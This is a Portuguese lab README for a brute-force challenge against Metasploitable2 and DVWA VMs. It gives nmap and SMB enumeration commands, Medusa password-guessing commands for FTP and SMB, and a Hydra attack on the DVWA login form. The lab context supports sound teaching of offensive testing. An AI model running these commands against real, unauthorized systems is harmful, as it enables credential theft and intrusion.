
# Desafio: Ataques de Força Bruta com Medusa (Kali + Metasploitable2/DVWA)

## Resumo
Projeto prático para demonstrar ataques de força bruta em ambiente controlado usando Kali Linux e Medusa, com alvo Metasploitable2 e DVWA. Objetivo: aprender enumeração, execução de ataques e propor medidas de mitigação.

> **Atenção:** todos os testes foram executados apenas em VMs de laboratório (Kali e Metasploitable). Não execute testes em sistemas sem autorização.

## Ambiente
- Hypervisor: VirtualBox  
- Kali Linux — IP: **192.168.1.2**  
- Metasploitable2 (alvo) — IP: **192.168.1.16**  
- Rede: Host-only / Internal Network

## Ferramentas utilizadas
- Kali Linux  
- Medusa  
- Nmap  
- smbclient, enum4linux  
- Hydra (opcional, para formulários HTTP)  
- ssh/sshfs

## Wordlists (exemplos)
- `wordlists/simples_usernames.txt`  
- `wordlists/simples_passwords.txt`  

*(Use wordlists maiores como `rockyou.txt` somente em laboratório.)*

## Comandos principais (exemplos)
### Enumeração
```bash
sudo nmap -sS -sV -p21,22,80,139,445,3306 192.168.1.16 -oN nmap_common.txt
smbclient -L //192.168.1.16 -N
enum4linux -a 192.168.1.16 > enum4linux.txt


medusa -h 192.168.1.16 -u msfadmin -P wordlists/simples_passwords.txt -M ftp -t 4 -f -O results/medusa_ftp.txt


medusa -h 192.168.1.16 -U wordlists/simples_usernames.txt -P wordlists/simples_passwords.txt -M smb -t 8 -f -O results/medusa_smb.txt


hydra -l admin -P wordlists/simples_passwords.txt 192.168.1.16 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect"



🧩 Evidências
1️⃣ Resultado do Nmap
<p align="center"> <img src="imagens/imagem1.png" alt="Nmap scan" width="600px" style="border-radius:10px; box-shadow: 0 0 10px rgba(0,0,0,0.2);"/> <br> <em>Figura 1 — Resultado do Nmap mostrando portas abertas.</em> </p>
2️⃣ Medusa – FTP
<p align="center"> <img src="imagens/imagem2.png" alt="Medusa FTP" width="600px" style="border-radius:10px; box-shadow: 0 0 10px rgba(0,0,0,0.2);"/> <br> <em>Figura 2 — Medusa encontrou credenciais válidas para FTP.</em> </p>
3️⃣ DVWA – Login
<p align="center"> <img src="imagens/imagem3.png" alt="DVWA login" width="600px" style="border-radius:10px; box-shadow: 0 0 10px rgba(0,0,0,0.2);"/> <br> <em>Figura 3 — Tela de login do DVWA usada para testes.</em> </p>
4️⃣ Teste adicional
<p align="center"> <img src="imagens/imagem4.png" alt="Teste" width="600px" style="border-radius:10px; box-shadow: 0 0 10px rgba(0,0,0,0.2);"/> <br> <em>Figura 4 — Descrição do teste.</em> </p>
5️⃣ Outra captura
<p align="center"> <img src="imagens/imagem5.png" alt="Outra captura" width="600px" style="border-radius:10px; box-shadow: 0 0 10px rgba(0,0,0,0.2);"/> <br> <em>Figura 5 — Outra captura relevante.</em> </p>
